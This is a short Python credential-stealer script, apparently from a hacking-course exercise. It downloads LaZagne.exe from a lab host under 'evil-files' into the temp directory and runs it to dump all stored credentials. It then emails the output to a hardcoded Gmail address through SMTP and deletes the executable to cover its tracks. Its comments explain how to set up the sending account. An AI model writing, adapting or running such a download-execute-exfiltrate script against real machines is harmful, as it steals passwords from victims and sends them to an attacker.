#!/usr/bin.env python

import requests, subprocess, smtplib, os, tempfile
import re

def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)

def send_email(email, password, message):
    # This function sends an email
    server = smtplib.SMTP('smtp.gmail.com', 587) # Connect to Gmail's SMTP server    
    server.starttls() # Upgrade the connection to a secure encrypted SSL/TLS connection
    server.login(email, password) # Log in to the email account
    server.sendmail(email, email, message) # Send the email
    server.quit() # Close the connection to the server    



temp_directory = tempfile.gettempdir() # Get the temporary directory
os.chdir(temp_directory) # Change the current working directory to the temporary directory
download("http://10.0.2.16/evil-files/LaZagne.exe")
command = "netsh wlan show profile" # This command retrieves the Wi-Fi profiles stored on the system
result = subprocess.check_output("laZagne.exe all", shell=True) # Execute the command and decode the output
send_email("jhnwck70@gmail.com", "password", result) # Send the output via email
os.remove("LaZagne.exe") # Remove the downloaded file

# the password above should be generated by going on to myaccount.google.com/security
# and enabling 2-step verification and then creating an app password for the email account.
# The script retrieves the Wi-Fi passwords stored on the system and sends them via email.
